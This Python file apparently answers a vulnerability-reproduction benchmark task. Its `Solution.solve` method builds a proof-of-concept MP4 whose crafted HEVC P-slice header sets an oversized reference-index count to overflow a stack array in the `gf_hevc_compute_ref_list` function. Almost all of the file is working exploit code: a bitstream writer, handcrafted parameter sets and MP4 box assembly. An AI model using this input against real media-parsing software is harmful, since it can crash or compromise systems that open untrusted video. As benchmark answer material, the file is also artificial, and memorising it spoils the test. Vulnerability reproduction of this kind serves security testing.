import struct

class _BitStream:
    """A helper class to write bitstreams, necessary for crafting HEVC headers."""
    def __init__(self):
        self.data = bytearray()
        self.bit_pos = 0

    def write_bit(self, bit: int):
        byte_idx = self.bit_pos // 8
        bit_idx = 7 - (self.bit_pos % 8)
        if byte_idx >= len(self.data):
            self.data.append(0)
        if bit:
            self.data[byte_idx] |= (1 << bit_idx)
        self.bit_pos += 1

    def write_bits(self, value: int, n: int):
        for i in range(n):
            bit = (value >> (n - 1 - i)) & 1
            self.write_bit(bit)

    def write_ue(self, value: int):
        """Writes an unsigned Exp-Golomb coded integer."""
        x = value + 1
        num_bits = x.bit_length()
        leading_zeros = num_bits - 1
        self.write_bits(0, leading_zeros)
        self.write_bits(x, num_bits)

    def align(self):
        """Aligns the bitstream to the next byte boundary."""
        while self.bit_pos % 8 != 0:
            self.write_bit(0)

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC MP4 file that triggers a stack buffer overflow in
        the gf_hevc_compute_ref_list function.

        The vulnerability is triggered by a large `num_ref_idx_l0_active_minus1`
        value in a P-slice header, causing a loop to write past the end of
        a fixed-size stack array (RefPicList0[16]).

        The PoC is a minimal MP4 file with a single HEVC video track containing
        one sample: a crafted HEVC P-slice NAL unit.
        """
        def box(box_type: bytes, content: bytes) -> bytes:
            return struct.pack('>I', 8 + len(content)) + box_type + content

        bs = _BitStream()
        bs.write_bit(1)
        bs.write_bit(0)
        bs.write_ue(0)
        bs.write_bits(0, 5)
        bs.write_bits(0, 3)
        bs.write_ue(1)
        bs.write_bits(0, 4)
        bs.write_bit(0)
        bs.write_ue(0)
        bs.write_ue(0)
        bs.write_bit(1)
        bs.write_ue(255)
        bs.write_ue(0)
        bs.write_ue(0)
        bs.write_bit(1)
        bs.align()

        malicious_nalu = b'\x02\x01' + bs.data

        ftyp_box = box(b'ftyp', b'isom\x00\x00\x02\x00isomiso6mp41')
        mdat_content = struct.pack('>I', len(malicious_nalu)) + malicious_nalu
        mdat_box = box(b'mdat', mdat_content)

        vps = b'\x40\x01\x0c\x01\xff\xff\x01\x60\x00\x00\x03\x00\xb0\x00\x00\x03\x00\x00\x03\x00\x7b\xac\x09'
        sps = b'\x42\x01\x01\x01\x60\x00\x00\x03\x00\xb0\x00\x00\x03\x00\x00\x03\x00\x7b\xa0\x03\xc0\x80\x10'
        pps = b'\x44\x01\xc0\xf1\x80\x00'
        hvcC_arrays = (
            b'\xa0\x00\x01' + struct.pack('>H', len(vps)) + vps +
            b'\xa1\x00\x01' + struct.pack('>H', len(sps)) + sps +
            b'\xa2\x00\x01' + struct.pack('>H', len(pps)) + pps
        )
        hvcC_header = b'\x01\x01\x60\x00\x00\x00\xb0\x00\x00\x03\x00\x00\x7b\x00\x00\x00\x01\x00\x00\x00\x00\x83\x03'
        hvcC_box = box(b'hvcC', hvcC_header + hvcC_arrays)

        hvc1_content = (
            b'\x00\x00\x00\x00\x00\x00\x00\x01' + b'\x00' * 16 +
            b'\x01\x60\x01\x20' + b'\x00\x48\x00\x00\x00\x48\x00\x00' +
            b'\x00\x00\x00\x00\x00\x01' + b'\x00' * 32 + b'\x00\x18\xff\xff'
        ) + hvcC_box
        hvc1_box = box(b'hvc1', hvc1_content)
        stsd_box = box(b'stsd', b'\x00\x00\x00\x00\x00\x00\x00\x01' + hvc1_box)

        stts_box = box(b'stts', b'\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x04\x00')
        stsc_box = box(b'stsc', b'\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x01')
        stsz_box = box(b'stsz', b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>I', len(mdat_content)))
        stco_placeholder = b'\xDE\xAD\xC0\xDE'
        stco_box = box(b'stco', b'\x00\x00\x00\x00\x00\x00\x00\x01' + stco_placeholder)

        stbl_box = box(b'stbl', stsd_box + stts_box + stsc_box + stsz_box + stco_box)
        vmhd_box = box(b'vmhd', b'\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00')
        dref_box = box(b'dref', b'\x00\x00\x00\x00\x00\x00\x00\x01' + box(b'url ', b'\x00\x00\x00\x01'))
        dinf_box = box(b'dinf', dref_box)
        minf_box = box(b'minf', vmhd_box + dinf_box + stbl_box)
        hdlr_box = box(b'hdlr', b'\x00\x00\x00\x00\x00\x00\x00\x00vide' + b'\x00'*12 + b'VideoHandler\x00')
        mdhd_box = box(b'mdhd', b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\xe8\x00\x00\x04\x00\x55\xc4\x00\x00')
        mdia_box = box(b'mdia', mdhd_box + hdlr_box + minf_box)
        tkhd_box = box(b'tkhd', b'\x00\x00\x00\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01' + b'\x00'*20 + b'\x01\x00\x00\x00' + b'\x00'*12 + b'\x01\x00\x00\x00' + b'\x00'*12 + b'\x40\x00\x00\x00\x01\x60\x00\x00\x01\x20\x00\x00')
        trak_box = box(b'trak', tkhd_box + mdia_box)
        mvhd_box = box(b'mvhd', b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\xe8\x00\x00\x04\x00\x00\x01\x00\x00\x01\x00\x00\x00' + b'\x00'*8 + b'\x00\x01\x00\x00' + b'\x00'*12 + b'\x00\x01\x00\x00' + b'\x00'*12 + b'\x40\x00\x00\x00' + b'\x00'*24 + b'\x02')
        moov_box = box(b'moov', mvhd_box + trak_box)

        poc_data = ftyp_box + moov_box + mdat_box
        mdat_offset = poc_data.find(b'mdat') + 8
        final_poc = poc_data.replace(stco_placeholder, struct.pack('>I', mdat_offset))

        return final_poc